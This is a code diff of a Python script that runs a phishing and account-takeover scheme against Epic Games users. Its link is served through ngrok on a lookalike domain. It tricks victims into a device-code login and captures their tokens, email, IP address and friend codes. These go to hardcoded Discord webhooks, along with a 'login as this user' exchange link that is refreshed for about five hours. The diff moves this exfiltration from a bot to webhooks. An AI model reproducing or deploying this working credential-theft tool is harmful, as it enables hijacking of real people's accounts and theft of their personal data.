@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with a 100-cycle refresh limit (approx. 5 hours)
-and indefinite core token refresh.
-- Last Updated: 2025-11-21 05:15:23
+Standalone Webhook Script with a reliable 5-hour token refresh and static link ID.
+- Last Updated: 2025-11-25
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -15,73 +14,19 @@ import zipfile
 import stat
 import platform
 import time
-import logging
-import asyncio
-import threading
-from datetime import datetime
-import http.server
-import socketserver
-import uuid
-import traceback
-import aiohttp
-import discord
-from discord.ext import commands
 
-# ==============================================================================
-# --- CONFIGURATION AND GLOBALS ---
-# ==============================================================================
-
-# --- Bot Configuration ---
-DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "YOUR_DISCORD_BOT_TOKEN_HERE")
-if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
-    print("FATAL: Please set the DISCORD_BOT_TOKEN environment variable.", file=sys.stderr)
-    sys.exit(1)
-
-# --- Ngrok Configuration ---
-NGROK_AUTHTOKEN = os.getenv("NGROK_AUTHTOKEN")
-NGROK_DOMAIN = "help.id-epicgames.com" # Will fall back to a free URL if this fails
-
-# --- Epic Games & Timings ---
-EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
-REFRESH_INTERVAL = 180  # 3 minutes for refreshing the exchange code
-MAX_REFRESHES = 100     # Limit the session to 100 refreshes (5 hours)
-VBUCKS_THRESHOLD = 5000
-
-# --- Channel Name ---
-MAIN_CHANNEL_NAME = "epic-auth-system"
-
-# --- Logging ---
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger("epic_auth_bot")
-
-# --- Globals ---
-intents = discord.Intents.default()
-intents.guilds = True
-intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
-
-ngrok_ready = threading.Event()
-verification_link = None
-
-active_sessions = {}
-session_lock = threading.Lock()
-
-# ==============================================================================
-# --- NGROK AND WEB SERVER (No changes) ---
-# ==============================================================================
 def run_setup():
+    """Ensures all dependencies and ngrok are installed before starting."""
     print("--- Starting initial setup ---")
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
     if not os.path.exists(ngrok_path):
         try:
             print("1/2: Downloading and installing ngrok...")
             machine, system = platform.machine().lower(), platform.system().lower()
-            ngrok_url = f"https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-{system}-{machine}.zip"
-            if system == "linux":
-                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
-                if "aarch64" in machine or "arm64" in machine:
-                    ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
-
+            ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
+            if system == "linux" and ("aarch64" in machine or "arm64" in machine):
+                ngrok_url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
+            
             with requests.get(ngrok_url, stream=True) as r:
                 r.raise_for_status()
                 with open("ngrok.zip", "wb") as f:
@@ -97,10 +42,11 @@ def run_setup():
     else:
         print("1/2: ngrok is already installed.")
 
-    if NGROK_AUTHTOKEN:
+    authtoken = os.getenv("NGROK_AUTHTOKEN")
+    if authtoken:
         try:
             print("2/2: Configuring ngrok authtoken...")
-            subprocess.check_call([ngrok_path, "config", "add-authtoken", NGROK_AUTHTOKEN], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print("     ngrok authtoken configured.")
         except Exception as e:
             print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
@@ -108,381 +54,306 @@ def run_setup():
         print("2/2: NGROK_AUTHTOKEN not set, skipping configuration.")
     print("--- Setup complete ---")
 
+run_setup()
 
-class RequestHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == '/verify':
-            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
-            logger.info(f"\n[VERIFY] 🌐 New verification request from IP: {client_ip}")
-            
-            try:
-                loop = asyncio.new_event_loop()
-                asyncio.set_event_loop(loop)
-                epic_session = loop.run_until_complete(create_epic_auth_session())
-                
-                threading.Thread(
-                    target=monitor_epic_auth_sync,
-                    args=(epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip),
-                    daemon=True
-                ).start()
-                
-                self.send_response(302)
-                self.send_header('Location', epic_session['activation_url'])
-                self.end_headers()
-            except Exception as e:
-                logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}")
-                self.send_error(500)
-        else:
-            self.send_error(404)
-
-    def log_message(self, format, *args):
-        pass
-
-def run_web_server(port):
-    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
-        logger.info(f"🚀 Web server starting on port {port}")
-        httpd.serve_forever()
-
-def setup_ngrok_tunnel(port):
-    global verification_link
-    ngrok_executable = os.path.join(os.getcwd(), "ngrok")
-    
-    if NGROK_AUTHTOKEN and NGROK_DOMAIN:
-        logger.info(f"🌐 Attempting to start ngrok tunnel with custom domain: {NGROK_DOMAIN}...")
-        command = [ngrok_executable, 'http', str(port), f'--domain={NGROK_DOMAIN}']
-        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    else:
-        logger.info("🌐 Starting ngrok tunnel with a free random domain...")
-        command = [ngrok_executable, 'http', str(port)]
-        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-    public_url = None
-    for i in range(8):
-        time.sleep(2.5)
-        try:
-            with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2) as r:
-                r.raise_for_status()
-                tunnels = r.json().get('tunnels', [])
-                if tunnels:
-                    custom_tunnel = next((t for t in tunnels if NGROK_DOMAIN in t.get('public_url', '')), None)
-                    if custom_tunnel:
-                        public_url = custom_tunnel['public_url']
-                        logger.info(f"✅ Successfully using custom domain: {public_url}")
-                    else:
-                        public_url = tunnels[0]['public_url']
-                        logger.warning(f"⚠️  Custom domain failed. Falling back to free URL: {public_url}")
-                    break
-        except requests.ConnectionError:
-            logger.info(f"ngrok API not ready, retrying... (Attempt {i+1})")
-            continue
-    
-    if public_url:
-        verification_link = f"{public_url}/verify"
-        logger.info(f"🔗 Verification Link is LIVE: {verification_link}")
-        ngrok_ready.set()
-    else:
-        logger.critical("❌ Ngrok failed to start or create a tunnel after 20 seconds.")
-        sys.exit(1)
+# --- MAIN APPLICATION IMPORTS ---
+import logging
+import asyncio
+import threading
+from datetime import datetime
+import http.server
+import socketserver
+import uuid
+import traceback
+import aiohttp
 
 # ==============================================================================
-# --- EPIC GAMES API & DISCORD LOGIC ---
+# --- CONFIGURATION AND GLOBALS ---
 # ==============================================================================
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger("webhook_runner")
 
+# Updated Webhook URLs
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442750522636636305/ZMdhE-kIfisoc4guJ8eiZwAMYdkqXauiqwMDzB1XfnDXnW9Z8VzQSzqbla6kRQveCldT"
+DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1442756837865685013/kcyGyz8Ea4Txr5qH5Um2p30q_KmcRRJnIIwdFpljQCHBzDd97FmSTdNg0kLgQbn-JtBy"
+REFRESH_INTERVAL = 120
+
+ngrok_ready = threading.Event()
+permanent_link = None
+permanent_link_id = None
+verification_uses = 0
+active_sessions = {}
+session_lock = threading.Lock()
+main_event_loop = asyncio.new_event_loop()
+
+# ==============================================================================
+# --- EPIC AUTHENTICATION WEBHOOK LOGIC ---
+# ==============================================================================
 async def create_epic_auth_session():
-    headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
+    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
     async with aiohttp.ClientSession() as sess:
-        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data={"grant_type": "client_credentials"}) as r:
+        async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
             r.raise_for_status()
             token_data = await r.json()
-        auth_headers = {"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}
-        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers=auth_headers) as r:
+        async with sess.post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/deviceAuthorization", headers={"Authorization": f"bearer {token_data['access_token']}", "Content-Type": "application/x-www-form-urlencoded"}) as r:
             r.raise_for_status()
             dev_auth = await r.json()
     return {'activation_url': f"https://www.epicgames.com/id/activate?userCode={dev_auth['user_code']}", 'device_code': dev_auth['device_code'], 'interval': dev_auth.get('interval', 5), 'expires_in': dev_auth.get('expires_in', 600)}
 
-
 async def get_exchange_code(access_token):
+    """Uses an access_token to get a new exchange code."""
     try:
         async with aiohttp.ClientSession() as sess:
-            headers = {"Authorization": f"bearer {access_token}"}
-            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers=headers) as r:
-                return (await r.json())['code'] if r.status == 200 else None
-    except Exception: return None
-
-async def refresh_access_token(refresh_token):
-    """Uses a refresh_token to get a new set of tokens."""
-    headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
-    data = {"grant_type": "refresh_token", "refresh_token": refresh_token}
-    try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
+            async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r:
                 if r.status == 200:
-                    return await r.json()
+                    return (await r.json())['code']
                 else:
-                    logger.error(f"Failed to refresh access token, status {r.status}: {await r.text()}")
+                    logger.warning(f"Failed to get exchange code, status {r.status}: {await r.text()}")
                     return None
     except Exception as e:
-        logger.error(f"❌ Exception while refreshing access token: {e}")
-        return None
+        logger.error(f"❌ Exception while getting exchange code: {e}"); return None
 
 async def get_stw_codes(access_token, account_id):
+    """Fetches Save The World friend codes for multiple platforms."""
     logger.info(f"[{account_id[:8]}] Fetching STW friend codes...")
+    platforms = ['epic', 'xbox']  # Removed 'psn' to prevent unnecessary errors
     all_codes = []
     headers = {"Authorization": f"Bearer {access_token}"}
+    
     async with aiohttp.ClientSession() as sess:
-        for platform in ['epic', 'xbox']:
+        for platform in platforms:
             url = f"https://fngw-mcp-gc-livefn.ol.epicgames.com/fortnite/api/game/v2/friendcodes/{account_id}/{platform}"
             try:
                 async with sess.get(url, headers=headers) as r:
-                    if r.status == 200 and (codes := await r.json()):
-                        all_codes.extend([f"{platform.upper()}: `{c['codeId']}`" for c in codes])
-            except Exception: continue
+                    if r.status == 200:
+                        codes = await r.json()
+                        if codes:
+                            logger.info(f"[{account_id[:8]}] Found {len(codes)} code(s) for {platform.upper()}")
+                            for code in codes:
+                                all_codes.append(f"{platform.upper()}: `{code['codeId']}`")
+                        else:
+                            logger.info(f"[{account_id[:8]}] No STW codes found for platform: {platform.upper()}")
+                    else:
+                        logger.warning(f"[{account_id[:8]}] Failed to fetch STW codes for {platform.upper()}, status: {r.status}")
+            except Exception as e:
+                logger.error(f"[{account_id[:8]}] Exception fetching STW codes for {platform.upper()}: {e}")
+                
     return all_codes
 
-
-async def get_vbucks_balance(access_token, account_id):
-    headers = {"Authorization": f"bearer {access_token}", "Content-Type": "application/json"}
-    url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core"
+async def auto_refresh_session(session_id, user_ip):
+    """Reliably refreshes the exchange code for the lifetime of the access token (approx. 5 hours)."""
     try:
-        async with aiohttp.ClientSession() as sess:
-            async with sess.post(url, headers=headers, json={}) as r:
-                if r.status == 200:
-                    data = await r.json()
-                    for item in data.get('profileChanges', [{}])[0].get('profile', {}).get('items', {}).values():
-                        if 'Currency:Mtx' in item.get('templateId', ''):
-                            return item.get('quantity', 0)
-    except Exception: return 0
-    return 0
-
-
-async def get_or_create_channel(guild, channel_name):
-    for channel in guild.text_channels:
-        if channel.name == channel_name:
-            return channel
-    try:
-        return await guild.create_text_channel(channel_name)
-    except discord.Forbidden:
-        logger.error(f"Failed to create channel '{channel_name}' in guild '{guild.name}'. Missing permissions.")
-        return None
-
-
-@bot.event
-async def on_guild_join(guild):
-    logger.info(f"Joined new guild: {guild.name} (ID: {guild.id})")
-    await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-
-
-@bot.event
-async def on_ready():
-    print(f'Logged in as {bot.user.name}\n' + "=" * 60)
-    for guild in bot.guilds:
-        channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-        if channel and verification_link and not bot.is_closed():
-            embed = discord.Embed(title="🚀 Epic Auth System Online", description=f"System is ready for verifications.\n\n🔗 **Verification Link:**\n`{verification_link}`", color=discord.Color.blue())
-            try:
-                await channel.send(embed=embed)
-            except discord.Forbidden:
-                logger.error(f"Could not send startup message to {guild.name}.")
-    print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).\n" + "=" * 60)
-
-
-def build_user_embed(session, exchange_code, is_initial):
-    """Helper function to build the consistent user information embed."""
-    account_info = session['account_info']
-    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
-    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
-
-    title = "✅ User Logged In Successfully" if is_initial else "🔄 User Session Refreshed"
-    description = f"**{display_name}** has completed verification." if is_initial else f"Session for **{display_name}** has been updated."
-    
-    is_high_value = session['vbucks'] > VBUCKS_THRESHOLD
-    embed_color = discord.Color.gold() if is_high_value else discord.Color.green()
-    embed = discord.Embed(title=title, description=description, color=embed_color)
-
-    embed.add_field(name="Display Name", value=display_name, inline=True)
-    embed.add_field(name="Email", value=email, inline=True)
-    embed.add_field(name="V-Bucks", value=f"**{session['vbucks']}** 💸" if session['vbucks'] > 0 else "0", inline=True)
-    
-    embed.add_field(name="Account ID", value=f"`{account_id}`", inline=False)
-    embed.add_field(name="IP Address", value=f"`{session['user_ip']}`", inline=False)
-    
-    if session['stw_codes']:
-        embed.add_field(name="🔑 Save The World Codes", value="\n".join(session['stw_codes']), inline=False)
-
-    embed.add_field(name="🔗 Direct Login Link", value=f"**[Click to login as this user]({login_link})**", inline=False)
-    embed.add_field(name="Exchange Code", value=f"```{exchange_code}```", inline=False)
-
-    footer_text = f"Session ID: {session['session_id']} | Refresh {session['exchange_refresh_count']}/{MAX_REFRESHES} | Core Refreshes: #{session['core_token_refresh_count']}"
-    embed.set_footer(text=footer_text)
-    embed.timestamp = datetime.utcnow()
-    
-    return embed
-
-
-async def send_or_update_embed(session_id, exchange_code, is_initial=False):
-    with session_lock:
-        session = active_sessions.get(session_id)
-        if not session: return
-
-    embed = build_user_embed(session, exchange_code, is_initial)
-
-    for guild in bot.guilds:
-        channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
-        if not channel: continue
-
-        if is_initial:
-            message = await channel.send(embed=embed)
-            with session_lock:
-                if session_id in active_sessions:
-                    active_sessions[session_id]['message_ids'][guild.id] = message.id
-        else:
-            message_id = session['message_ids'].get(guild.id)
-            if not message_id: continue
-            try:
-                message = await channel.fetch_message(message_id)
-                await message.edit(embed=embed)
-            except (discord.NotFound, discord.Forbidden):
-                logger.warning(f"Failed to edit message {message_id} in {guild.name}. Re-sending.")
-                new_message = await channel.send(embed=embed)
-                with session_lock:
-                    if session_id in active_sessions:
-                        active_sessions[session_id]['message_ids'][guild.id] = new_message.id
-
-
-# ==============================================================================
-# --- CORE AUTHENTICATION & REFRESH LOGIC ---
-# ==============================================================================
-
-def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try: loop.run_until_complete(monitor_epic_auth(device_code, interval, expires_in, user_ip))
-    finally: loop.close()
-
-
-async def monitor_epic_auth(device_code, interval, expires_in, user_ip):
-    """Monitors the Epic Games device authentication flow for completion."""
-    logger.info(f"[{device_code[:8]}] 👁️  Monitoring Epic auth...")
-    async with aiohttp.ClientSession() as sess:
-        deadline = time.time() + expires_in
-        while time.time() < deadline:
-            await asyncio.sleep(interval)
-            data = {"grant_type": "device_code", "device_code": device_code}
-            headers = {"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}
-            
-            async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers=headers, data=data) as r:
-                if r.status != 200: continue
-                
-                token_resp = await r.json()
-                if "access_token" in token_resp:
-                    account_id = token_resp['account_id']
-                    logger.info(f"[{account_id[:8]}] ✅ USER LOGGED IN!")
-                    
-                    auth_headers = {"Authorization": f"bearer {token_resp['access_token']}"}
-                    async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers=auth_headers) as r3:
-                        account_info = await r3.json()
-                    
-                    exchange_code = await get_exchange_code(token_resp['access_token'])
-                    if not exchange_code: return
-
-                    stw_codes = await get_stw_codes(token_resp['access_token'], account_id)
-                    vbucks = await get_vbucks_balance(token_resp['access_token'], account_id)
-
-                    session_id = str(uuid.uuid4())[:8]
-                    with session_lock:
-                        active_sessions[session_id] = {
-                            'session_id': session_id,
-                            'access_token': token_resp['access_token'],
-                            'access_token_expires_at': time.time() + token_resp['expires_in'],
-                            'refresh_token': token_resp['refresh_token'],
-                            'account_info': account_info,
-                            'user_ip': user_ip,
-                            'stw_codes': stw_codes,
-                            'vbucks': vbucks,
-                            'message_ids': {},
-                            'exchange_refresh_count': 0,
-                            'core_token_refresh_count': 0
-                        }
-                    
-                    asyncio.run_coroutine_threadsafe(send_or_update_embed(session_id, exchange_code, is_initial=True), bot.loop)
-                    asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id), bot.loop)
-                    return
-
-
-async def auto_refresh_session(session_id):
-    """Refreshes tokens and updates the Discord message for 100 cycles (approx. 5 hours)."""
-    with session_lock:
-        session = active_sessions.get(session_id)
-        if not session: return
-        display_name = session['account_info'].get('displayName', 'Unknown')
-        
-    logger.info(f"[{session_id}] 🔄 5-hour (100 cycle) refresh task STARTED for {display_name}.")
-    
-    while session and session.get('exchange_refresh_count', 0) < MAX_REFRESHES:
-        await asyncio.sleep(REFRESH_INTERVAL)
-        
         with session_lock:
             session = active_sessions.get(session_id)
-            if not session: break
-        
-        # Proactively refresh the core access token if it's about to expire
-        if time.time() > session['access_token_expires_at'] - 600: # 10-minute buffer
-            logger.info(f"[{session_id}] Core access token is expiring. Attempting to refresh...")
-            new_token_data = await refresh_access_token(session['refresh_token'])
-            
-            if new_token_data:
-                with session_lock:
-                    if session_id in active_sessions:
-                        active_sessions[session_id].update({
-                            'access_token': new_token_data['access_token'],
-                            'access_token_expires_at': time.time() + new_token_data['expires_in'],
-                            'refresh_token': new_token_data['refresh_token'],
-                            'core_token_refresh_count': session['core_token_refresh_count'] + 1
-                        })
-                        session = active_sessions[session_id]
-                logger.info(f"[{session_id}] ✅ Core access token has been successfully refreshed.")
-            else:
-                logger.error(f"[{session_id}] ❌ FATAL: Could not refresh core access token. Session will now terminate.")
-                break 
+            if not session:
+                logger.warning(f"[{session_id}] Session not found at start of auto-refresh."); return
+            display_name = session['account_info'].get('displayName', 'Unknown')
+            session_expiry_time = session['expires_at']
 
-        # Refresh the short-lived exchange code
-        new_exchange_code = await get_exchange_code(session['access_token'])
-        if new_exchange_code:
+        logger.info(f"[{session_id}] 🔄 Auto-refresh task STARTED for {display_name}. Will run for approx. 5 hours.")
+
+        while time.time() < session_expiry_time:
+            await asyncio.sleep(REFRESH_INTERVAL)
+            
             with session_lock:
-                if session_id in active_sessions:
-                    active_sessions[session_id]['exchange_refresh_count'] += 1
-            
-            logger.info(f"[{session_id}] ✅ Exchange code refreshed for {display_name} (Refresh #{session['exchange_refresh_count']}/{MAX_REFRESHES})")
-            await send_or_update_embed(session_id, new_exchange_code)
-        else:
-            logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Retrying in {REFRESH_INTERVAL}s.")
+                session = active_sessions.get(session_id)
+                if not session:
+                    logger.info(f"[{session_id}] ⏹️ Session removed from outside; stopping auto-refresh for {display_name}"); break
+                current_access_token = session['access_token']
 
-    with session_lock: active_sessions.pop(session_id, None)
-    logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name} after reaching the 100-cycle limit.")
+            new_exchange_code = await get_exchange_code(current_access_token)
 
+            if new_exchange_code:
+                with session_lock:
+                    session = active_sessions.get(session_id)
+                    if not session: break
+                    session['refresh_count'] += 1
+                    session['last_refresh'] = time.time()
+                    refresh_count = session['refresh_count']
+                    account_info = session['account_info']
 
-# ==============================================================================
-# --- APPLICATION STARTUP ---
-# ==============================================================================
+                logger.info(f"[{session_id}] ✅ Exchange code REFRESHED for {display_name} (Refresh #{refresh_count})")
+                await send_refresh_update(session_id, account_info, new_exchange_code, user_ip, refresh_count)
+            else:
+                logger.warning(f"[{session_id}] Exchange code refresh failed for {display_name}. Will retry in {REFRESH_INTERVAL} seconds.")
+                continue
 
-def main():
-    run_setup()
+    except asyncio.CancelledError:
+        logger.info(f"[{session_id}] ⏹️ Auto-refresh task was cancelled for {display_name}")
+    finally:
+        with session_lock:
+            session_info = active_sessions.pop(session_id, None)
+            display_name = session_info['account_info'].get('displayName', 'Unknown') if session_info else 'Unknown'
+        logger.info(f"[{session_id}] 🔚 Auto-refresh task ENDED for {display_name}. (Either completed its 5-hour window or was cancelled).")
+
+def monitor_epic_auth_sync(verify_id, device_code, interval, expires_in, user_ip):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        loop.run_until_complete(monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip))
+    finally:
+        loop.close()
+
+async def monitor_epic_auth(verify_id, device_code, interval, expires_in, user_ip):
+    EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
+    logger.info(f"[{verify_id}] 👁️  Monitoring Epic auth...")
+    try:
+        async with aiohttp.ClientSession() as sess:
+            deadline = time.time() + expires_in
+            while time.time() < deadline:
+                await asyncio.sleep(interval)
+                async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "device_code", "device_code": device_code}) as r:
+                    if r.status != 200: continue
+                    token_resp = await r.json()
+                    if "access_token" in token_resp:
+                        logger.info(f"[{verify_id}] ✅ USER LOGGED IN!")
+                        access_token = token_resp['access_token']
+                        account_id = token_resp['account_id']
+                        
+                        async with sess.get("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange", headers={"Authorization": f"bearer {access_token}"}) as r2: exchange_data = await r2.json()
+                        async with sess.get(f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{account_id}", headers={"Authorization": f"bearer {access_token}"}) as r3: account_info = await r3.json()
+                        
+                        # Fetch STW codes
+                        stw_codes = await get_stw_codes(access_token, account_id)
+
+                        session_id = str(uuid.uuid4())[:8]
+                        with session_lock:
+                            active_sessions[session_id] = {
+                                'access_token': access_token,
+                                'account_info': account_info,
+                                'user_ip': user_ip,
+                                'created_at': time.time(),
+                                'last_refresh': time.time(),
+                                'refresh_count': 0,
+                                # Set expiry to 5 hours (18000 seconds)
+                                'expires_at': time.time() + 18000
+                            }
+                        
+                        asyncio.run_coroutine_threadsafe(send_login_success(session_id, account_info, exchange_data['code'], user_ip, stw_codes), main_event_loop)
+                        asyncio.run_coroutine_threadsafe(auto_refresh_session(session_id, user_ip), main_event_loop)
+                        return
+    except Exception as e:
+        logger.error(f"[{verify_id}] ❌ Monitoring error: {e}\n{traceback.format_exc()}")
+
+async def send_webhook_message(webhook_url, payload):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(webhook_url, json=payload) as resp:
+                if not (200 <= resp.status < 300):
+                    logger.warning(f"Webhook send failed with status {resp.status}: {await resp.text()}")
+    except Exception as e:
+        logger.error(f"❌ Webhook error: {e}")
+
+async def send_login_success(session_id, account_info, exchange_code, user_ip, stw_codes):
+    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
+    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
+    
+    fields = [
+        {"name": "Display Name", "value": display_name, "inline": True},
+        {"name": "Email", "value": email, "inline": True},
+        {"name": "Account ID", "value": f"`{account_id}`", "inline": False},
+        {"name": "IP Address", "value": f"`{user_ip}`", "inline": False},
+        {"name": "Session ID", "value": f"`{session_id}`", "inline": False}
+    ]
+
+    if stw_codes:
+        codes_value = "\n".join(stw_codes) if stw_codes else "None found."
+        fields.append({"name": "🔑 Save The World Codes", "value": codes_value, "inline": False})
+
+    fields.extend([
+        {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False},
+        {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}
+    ])
+    
+    embed = {
+        "title": "✅ User Logged In Successfully", 
+        "description": f"**{display_name}** has completed verification!\n\n🔄 *Session will now refresh for approx. 5 hours.*", 
+        "color": 3066993, 
+        "fields": fields, 
+        "footer": {"text": f"Link uses: {verification_uses} | Auto-Refresh: ON (5-hour window)"}, 
+        "timestamp": datetime.utcnow().isoformat()
+    }
+    await send_webhook_message(DISCORD_WEBHOOK_URL, {"embeds": [embed]})
+
+async def send_refresh_update(session_id, account_info, exchange_code, user_ip, refresh_count):
+    display_name, email, account_id = account_info.get('displayName', 'N/A'), account_info.get('email', 'N/A'), account_info.get('id', 'N/A')
+    login_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https%3A%2F%2Flauncher.store.epicgames.com%2Fsite%2Faccount"
+    embed = {"title": "🔄 Exchange Code Refreshed", "description": f"**{display_name}** - New exchange code generated!", "color": 3447003, "fields": [{"name": "Display Name", "value": display_name, "inline": True}, {"name": "Email", "value": email, "inline": True}, {"name": "Account ID", "value": f"`{account_id}`", "inline": False}, {"name": "IP Address", "value": f"`{user_ip}`", "inline": False}, {"name": "Session ID", "value": f"`{session_id}`", "inline": False}, {"name": "🔗 Direct Login Link", "value": f"**[Click to login as this user]({login_link})**", "inline": False}, {"name": "Exchange Code", "value": f"```{exchange_code}```", "inline": False}], "footer": {"text": f"Refresh #{refresh_count} | Refreshed at {datetime.utcnow().strftime('%H:%M:%S UTC')}"}, "timestamp": datetime.utcnow().isoformat()}
+    await send_webhook_message(DISCORD_UPDATES_WEBHOOK_URL, {"embeds": [embed]})
+
+def send_webhook_startup_message(link):
+    embed = {"title": "🚀 Epic Auth System Started", "description": f"System is online and ready!\n\n🔗 **Permanent Verification Link:**\n`{link}`", "color": 3447003}
+    requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
+
+class RequestHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        global verification_uses
+        if self.path.startswith('/verify/'):
+            if not permanent_link_id or self.path.split('/')[-1] != permanent_link_id: return self.send_error(404, "Link not found")
+            verification_uses += 1
+            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+            logger.info(f"\n[{permanent_link_id}] 🌐 User #{verification_uses} clicked link from IP: {client_ip}")
+            try:
+                loop = asyncio.new_event_loop()
+                epic_session = loop.run_until_complete(create_epic_auth_session())
+                loop.close()
+                threading.Thread(target=monitor_epic_auth_sync, args=(permanent_link_id, epic_session['device_code'], epic_session['interval'], epic_session['expires_in'], client_ip), daemon=True).start()
+                self.send_response(302); self.send_header('Location', epic_session['activation_url']); self.end_headers()
+            except Exception as e:
+                logger.error(f"❌ Error during auth session creation: {e}\n{traceback.format_exc()}"); self.send_error(500)
+        else: self.send_error(404)
+    def log_message(self, format, *args): pass
+
+def run_web_server(port):
+    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd:
+        logger.info(f"🚀 Web server starting on port {port}"); httpd.serve_forever()
+
+def setup_ngrok_tunnel(port):
+    global permanent_link, permanent_link_id
+    ngrok_executable = os.path.join(os.getcwd(), "ngrok")
+    try:
+        logger.info("🌐 Starting ngrok...")
+        # Updated to use the custom domain provided
+        subprocess.Popen([ngrok_executable, 'http', '--domain=help.id-epicgames.com', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(3) 
+
+        for i in range(12):
+            try:
+                with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5) as r:
+                    r.raise_for_status()
+                    for tunnel in r.json().get('tunnels', []):
